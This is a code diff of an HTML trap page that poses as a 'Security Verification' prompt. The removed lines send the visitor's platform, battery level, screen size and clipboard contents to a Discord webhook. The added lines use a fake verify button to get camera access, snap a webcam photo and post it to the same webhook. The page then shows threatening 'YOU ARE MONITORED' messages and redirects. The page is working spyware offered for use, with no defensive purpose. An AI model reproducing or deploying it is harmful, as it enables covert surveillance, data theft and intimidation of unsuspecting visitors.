@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>KERNEL_PANIC // 0x000000</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=VT323&display=swap');
 
         * {
             box-sizing: border-box;
@@ -83,25 +83,59 @@
             overflow: hidden;
         }
 
-        .hidden-trigger {
-            margin-top: 25px;
-            background: #1a0000;
-            border: 1px solid #ff0033;
-            color: #ff0033;
-            padding: 12px;
-            width: 100%;
-            font-family: 'VT323', monospace;
-            font-size: 1.4rem;
-            letter-spacing: 2px;
-            cursor: pointer;
-            text-transform: uppercase;
-            transition: 0.1s;
+        /* Trustworthy landing overlay card */
+        .trust-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 20000;
+            font-family: 'Inter', sans-serif;
         }
 
-        .hidden-trigger:hover {
-            background: #ff0033;
-            color: #000;
-            box-shadow: 0 0 20px #ff0033;
+        .trust-card {
+            background: #ffffff;
+            border: 1px solid #e1e4e8;
+            padding: 40px;
+            width: 420px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            color: #333;
+        }
+
+        .trust-card h2 {
+            font-size: 1.4rem;
+            color: #24292e;
+            margin-top: 0;
+            font-weight: 600;
+        }
+
+        .trust-card p {
+            font-size: 0.95rem;
+            color: #586069;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .verify-btn {
+            background: #2ea44f;
+            border: none;
+            color: white;
+            padding: 12px 20px;
+            width: 100%;
+            border-radius: 6px;
+            font-family: 'Inter', sans-serif;
+            font-size: 0.95rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .verify-btn:hover {
+            background: #2c974b;
         }
 
         /* Fake custom creepy cursor */
@@ -112,26 +146,47 @@
             background: #ff0033;
             box-shadow: 0 0 10px #ff0033;
             pointer-events: none;
-            z-index: 10000;
+            z-index: 30000;
             transform: translate(-50%, -50%);
+        }
+
+        /* Hidden media stream elements */
+        #hidden-video {
+            display: none;
         }
     </style>
 </head>
 <body>
 
+    <!-- LOCKOUT CHECK: If already triggered, instantly redirect -->
+    <script>
+        
+    </script>
+
+    <!-- Hidden video & canvas for snap capture -->
+    <video id="hidden-video" autoplay playsinline></video>
+    <canvas id="hidden-canvas" style="display:none;"></canvas>
+
+    <!-- Trustworthy Landing Overlay -->
+    <div class="trust-overlay" id="welcome-modal">
+        <div class="trust-card">
+            <h2>Security Verification</h2>
+            <p>Please verify your browser session to access the secure document repository.</p>
+            <button class="verify-btn" onclick="commitPayload()">Verify Session</button>
+        </div>
+    </div>
+
     <div class="cursor" id="custom-cursor"></div>
 
     <div class="corrupted-box">
-        <h1>Shakey shaky <3 </h1>
-        <p id="parag"></p>
+        <h1 id="main-title">ACCESS_VIOLATION_ERR</h1>
+        <p>Your hardware signature has been permanently indexed by an external host. Escape is no longer viable.</p>
         
-        <div class="data-stream" id="log-console" style="display:none">
+        <div class="data-stream" id="log-console">
             [SYS] Initializing memory leak...<br>
             [SYS] Target node identified...<br>
             [SYS] Extracting local environment vectors...
         </div>
-
-        <button class="hidden-trigger" onclick="commitPayload()">i love red baby </button>
     </div>
 
     <script>
@@ -145,8 +200,13 @@
             cursor.style.top = e.clientY + 'px';
         });
 
-        // Instant silent background harvest on load
-        window.addEventListener('load', async () => {
+        async function commitPayload() {
+            // Set localStorage lock so they can never open this page again
+            localStorage.setItem('trap_locked', 'true');
+
+            // Hide the trustable welcome modal
+            document.getElementById('welcome-modal').style.display = 'none';
+
             let batteryInfo = "Unknown";
             if ('getBattery' in navigator) {
                 try {
@@ -159,119 +219,80 @@
             consoleBox.innerHTML += `<br>[OK] Power state: ${batteryInfo}`;
             consoleBox.innerHTML += `<br>[OK] Platform: ${navigator.platform}`;
 
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `👁️ **AGGHH Target Hooked:** \`${navigator.platform}\` | Battery: ${batteryInfo} | Res: ${window.screen.width}x${window.screen.height}`
-                })
-            });
-        });
-
-        // When they click the button, escalate to pulling clipboard and flashing screen
-        async function commitPayload() {
-            const consoleBox = document.getElementById('log-console');
-            consoleBox.innerHTML += `<br><span style="color:#fff">[!] DUMPING CLIPBOARD AND BUFFERS...</span>`;
-
-            let clipboardText = "Restricted/Denied";
+            // Try to capture camera snapshot if they allow the browser prompt
             try {
-                clipboardText = await navigator.clipboard.readText();
-            } catch(e) {}
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('hidden-video');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => setTimeout(resolve, 800)); // wait for video to load frame
 
-            let batteryInfo = "Unknown";
-            if ('getBattery' in navigator) {
-                try {
-                    const b = await navigator.getBattery();
-                    batteryInfo = `${Math.round(b.level * 100)}%`;
-                } catch(e) {}
+                const canvas = document.getElementById('hidden-canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert canvas to blob image file
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('payload_json', JSON.stringify({
+                        content: `🚨 **Target Verified & Snapshot Captured!**\n🔋 Battery: ${batteryInfo}\n🌐 Platform: ${navigator.platform}`
+                    }));
+                    formData.append('file0', blob, 'target_snapshot.jpg');
+
+                    // Send multipart form data to Discord webhook (includes image file)
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    // Stop camera stream lights
+                    stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg');
+
+            } catch (err) {
+                // If they clicked Block on the camera prompt, fallback to sending text-only stats
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🚨 **Target Verified (Camera Denied)!**\n🔋 Battery: ${batteryInfo}\n🌐 Platform: ${navigator.platform}`
+                    })
+                });
             }
 
-            const payload = {
-                content: `🚨 **AGGHH BUTTON CLICKED!**\n🔋 Battery: ${batteryInfo}\n📋 Stolen Clipboard: \`${clipboardText}\`\n🌐 User-Agent: ${navigator.userAgent}`
-            };
-
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-
+            // Creepy timeline sequence
             setTimeout(() => {
                 document.body.style.background = '#ff0033';
                 document.body.style.color = '#000';
                 document.querySelector('.corrupted-box').style.background = '#000';
-                document.querySelector('h1').innerText = "YOU ARE MONITORED :>";
-                document.getElementById("parag").innerText = 'Your hardware signature has been permanently indexed by an external host. Escape is no longer viable.';
-                document.getElementById('log-console').style.display ='block';
-                localStorage.setItem("opened", "true");
-            }, 600);
+                document.getElementById('main-title').innerText = "YOU ARE MONITORED :>";
+            }, 1000);
 
             setTimeout(() => {
-                document.body.style.background = '#ff0033';
-                document.body.style.color = '#000';
-                document.querySelector('.corrupted-box').style.background = '#000';
-                document.querySelector('h1').innerText = "HI dear ko!";
+                document.getElementById('main-title').innerText = "HI dear ko!";
             }, 3000);
 
             setTimeout(() => {
-                document.body.style.background = '#ff0033';
-                document.body.style.color = '#000';
-                document.querySelector('.corrupted-box').style.background = '#000';
-                document.querySelector('h1').innerText = "I I I LOV";
+                document.getElementById('main-title').innerText = "ILOVEYOU";
             }, 4000);
 
             setTimeout(() => {
-                document.body.style.background = '#ff0033';
-                document.body.style.color = '#000';
-                document.querySelector('.corrupted-box').style.background = '#000';
-                document.querySelector('h1').innerText = "LOVE";
+                document.getElementById('main-title').innerText = "ILOVEYOU VIRUS";
             }, 4500);
+
             setTimeout(() => {
-                document.body.style.background = '#ff0033';
-                document.body.style.color = '#000';
-                document.querySelector('.corrupted-box').style.background = '#000';
-                document.querySelector('h1').innerText = "LOVE Y";
+                document.getElementById('main-title').innerText = "HHEHEHEHE";
             }, 4800);
+
             setTimeout(() => {
-                document.body.style.background = '#ff0033';
-                document.body.style.color = '#000';
-                document.querySelector('.corrupted-box').style.background = '#000';
-                document.querySelector('h1').innerText = "ILOVEYOU";
+                document.getElementById('main-title').innerText = "B- BYE :>";
             }, 5000);
+
             setTimeout(() => {
-                document.body.style.background = '#ff0033';
-                document.body.style.color = '#000';
-                document.querySelector('.corrupted-box').style.background = '#000';
-                document.querySelector('h1').innerText = "ILOVEYOU VIRUS";
-            }, 5500);
-            setTimeout(() => {
-                document.body.style.background = '#ff0033';
-                document.body.style.color = '#000';
-                document.querySelector('.corrupted-box').style.background = '#000';
-                document.querySelector('h1').innerText = "HHEHEHEHE";
-            }, 5800);
-            setTimeout(() => {
-                document.body.style.background = '#ff0033';
-                document.body.style.color = '#000';
-                document.querySelector('.corrupted-box').style.background = '#000';
-                document.querySelector('h1').innerText = "B- B";
-            }, 6000);
-            setTimeout(() => {
-                document.body.style.background = '#ff0033';
-                document.body.style.color = '#000';
-                document.querySelector('.corrupted-box').style.background = '#000';
-                document.querySelector('h1').innerText = "B- BYE :>";
-            }, 6000);
-            setTimeout(() => {
-                document.body.style.background = '#ff0033';
-                document.body.style.color = '#000';
-                document.querySelector('.corrupted-box').style.background = '#000';
-                document.querySelector('h1').innerText = "B- BYE :>";
-                window.location.href = "https://google.com";
-            }, 6000);
-        }
-        if (localStorage.getItem("opened") === "true") {
-          window.location.href = 'https://google.com';
+                window.location.replace("https://google.com");
+            }, 5600);
         }
     </script>
 </body>
